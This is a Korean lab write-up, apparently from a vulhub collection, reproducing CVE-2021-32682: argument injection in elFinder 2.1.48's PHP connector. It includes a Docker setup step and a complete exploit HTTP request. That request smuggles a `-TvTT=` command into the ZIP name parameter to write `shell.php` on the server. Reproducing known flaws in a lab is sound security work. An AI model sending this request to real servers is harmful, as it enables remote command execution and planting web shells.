# CVE-2021-32682

## elFinder ZIP 인수 삽입으로 인해 명령 삽입이 발생함

elFinder는 jQuery UI를 사용하여 JavaScript로 작성된 웹용 오픈 소스 파일 관리자이다.

elFinder 2.1.48 및 이전 버전에서 인수 주입 취약점이 발견되었다. 이 취약점으로 인해 공격자는 최소한의 구성으로도 elFinder PHP 커넥터를 호스팅하는 서버에서 임의의 명령을 실행할 수 있다. 이 문제는 버전 2.1.59에서 패치되었다. 인증 없이 커넥터가 노출되지 않도록 주의해야 한다.

참고자료:
* https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerability
* https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
* https://xz.aliyun.com/t/10739

## 취약점 환경
elFinder 2.1.48을 시작하려면 아래 명령을 수행한다.

```
docker compose up -d
```

## Vulnerability Reproduce
먼저, 2개의 파일을 준비해야 한다. 아래와 같은 일반 텍스트 파일을 만든다.
<img src="https://github.com/mmingidan/WHS/blob/main/vulhub/make_txt.png?raw=true">


마우스 오른쪽 버튼 클릭 메뉴에서 이 파일을 ZIP 형식으로 보관하고 보관된 파일 이름을 아래와 같이 수정한다.
<img src="https://github.com/mmingidan/WHS/assets/102302841/db6212f2-a934-4a13-acc1-d506068da805">

txt 파일(a.txt)과 zip 파일(a.zip)이 모두 준비되었다.
<img src="https://github.com/mmingidan/WHS/blob/main/vulhub/file_fin.png?raw=true">



임의의 명령을 실행하기 위해서 아래와 같은 요청을 수행한다.
```
GET /php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php%20%23%20a.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://localhost.lan:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
```

이 요청에서는 **3가지 중요한 매개변수**를 볼 수 있다.

- `name`은 임의의 명령으로 `-TvTT=id>shell.php # a.zip`을 수정할 수 있다. => `id>shell.php`
- `targets[0]`,  `l1_MS50eHQ. l1`첫 번째 저장 볼륨을 의미하며 MS50eHQbase64로 인코딩된 문자열이다. => `a.txt`
- `targets[1]`,  `l1_Mi56aXA. l1`첫 번째 저장 볼륨을 의미하며 Mi56aXAbase64로 인코딩된 문자열이다. => `a.zip`
이 요청은 오류 메시지에 응답했지만 명령이 실행되어 shell.php다음 위치에 기록되었다. `http://your-ip:8080/files/shell.php`.

<img src="https://github.com/mmingidan/WHS/blob/main/vulhub/web.png?raw=true">
